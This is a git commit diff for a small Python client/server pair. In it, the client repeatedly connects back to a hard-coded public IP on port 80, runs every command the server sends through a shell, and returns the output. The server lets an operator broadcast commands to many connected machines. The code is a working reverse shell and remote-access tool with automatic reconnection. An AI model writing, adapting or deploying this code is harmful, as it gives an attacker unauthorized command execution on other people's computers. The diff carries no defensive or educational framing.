3e070ca4e030ba6e0c1d6518037f230e84ff7787
alkan212 <alkanakdeniz21@gmail.com>
2021-08-31 13:03:15 -0400

    socket

--- client.py
+++ client.py
@@ -3,27 +3,57 @@ import os
 import sys
 import subprocess
 import base64
+from time import sleep
+import threading
 
 host_name = os.getlogin()
 
 HOST = socket._LOCALHOST  # non-local => changer socket._LOCALHOST en votre ip 
-PORT = 4567
+PORT = 80
 
 filename = "data_socket1.txt"
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.connect(("192.168.0.208", PORT)) 
+server = ""
 
-
-while True:
-    data = server.recv(1024).decode("utf-8")
-
-    if len(data) > 0:
+def try_connect():
+    global server
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        sleep(1)
+        print('try')
         try:
-            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-            out, err = proc.communicate()
-            server.send(out)
+            server.connect(("94.224.72.101", PORT)) 
+            break
         except Exception as e:
-            print("error", e)
-            server.send(f"Client Error : {e}")
-            sys.exit()
+            pass
+
+def recv_data():
+    global server
+    while True:
+        sleep(1)
+        try:
+            data = server.recv(1024).decode("utf-8")
+
+            if len(data) > 0:
+                try:
+                    proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+                    out, err = proc.communicate()
+                    if len(out.decode("ISO-8859-1")) > 0:
+                        server.send(out)
+                    elif proc.returncode == 1:
+                        server.send("Error".encode("utf-8"))
+                    else:
+                        server.send("Success".encode("utf-8"))
+                except Exception as e:
+                    print("error", e)
+                    server.send(f"Client Error : {e}")
+                    try_connect()
+        except:
+            try_connect()
+
+
+
+
+
+try_connect()
+recv_data()
--- server.py
+++ server.py
@@ -6,54 +6,84 @@ from time import sleep
 import base64
 from colorama import Fore, Back, Style
 
- 
+loop = True
 data = ""
 clients = []
+wfr = False #waiting_for_data
+ip_list = []
+
+def p_command(text=""):
+    print(f"{Fore.WHITE}>> {Style.RESET_ALL}{text}")
+
+
 
 def connect():
-    global clients
-    while True:
-        
+    global clients, loop, data
+    while loop:
         ip = "192.168.0.208"
 
+        if len(clients) <= 0: p_command(f"{Fore.CYAN}waiting for connection\n")
+
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind((ip, 1234))
+        server.bind((ip, 80))
         server.listen(5)
+
 
         connection , address = server.accept()
         clients.append({"connection":connection,"address":address})
 
-        print("connected with", address)
+        if address[0] not in ip_list:
+            ip_list.append(address[0])
+        else:
+            connection.close()
+
+        if len(clients) == 1 : p_command(f"{Fore.GREEN}new connection : {address}  (connections:{len(clients)}){Style.RESET_ALL}\n")
+        else: 
+            p_command(f"{Fore.GREEN}new connection : {address}  (connections:{len(clients)}){Style.RESET_ALL}\n")
+ 
+
 
 
 def send_data():
-    global data
-    while True:
+    global data, wfr, loop
+    while loop:
+        if wfr == False and len(clients) > 0:
+            wfr = True
+            
+            data = bytes(input(f""), "utf-8")
 
-        data = bytes(input(f"{Fore.RED}command: {Style.RESET_ALL}"), "utf-8")
-        for index, client in enumerate(clients):
-            try:
-                client["connection"].send(data)
-            except:
-                print(client["address"], "diconnected \n")
-                clients.pop(index)
+            if len(data) > 0:
+                if data.decode("utf-8") == "exit": #exit server
+                    loop = False
+
+                for index, client in enumerate(clients): 
+                    try:
+                        client["connection"].send(data)
+                    except:
+                        p_command(f"{client['address']} disconnected\n")
+                        clients.pop(index)
 
 
 
 def recv_data():
-    global client
-    while True:
-   
-        for index, client in enumerate(clients):
-            try:
-                data = client["connection"].recv(1024).decode("ISO-8859-1")
-                data = data.replace("ÿ", " ")
-                if len(data) > 0:
-                    print(Fore.CYAN , client["address"] , Style.RESET_ALL," : ", data, "\n")
-            except:
-                print(Fore.CYAN , client["address"] , Style.RESET_ALL, "disconnected \n")
-                clients.pop(index)
+    global client, wfr, loop
+    while loop:
+        if len(clients) > 0:
+            for index, client in enumerate(clients):
+                try:
+                    data = client["connection"].recv(1024).decode("ISO-8859-1")
+                    data = data.replace("ÿ", " ")
+                    if len(data) > 0:
+                        p_command(f"{Fore.CYAN}{client['address'][0]}{Style.RESET_ALL} : {data}")
+                except:
+                    print(f"{Fore.CYAN}{client['address'][0]} disconnected \n")
+                    p_command()
+                    clients.pop(index)
 
+            try:
+                if len(data) > 0:
+                    wfr = False
+            except:pass
 
 
 
@@ -68,3 +98,5 @@ thread_recv.start()
 thread_connect.join()
 thread_send.join()
 thread_recv.join()
+
+
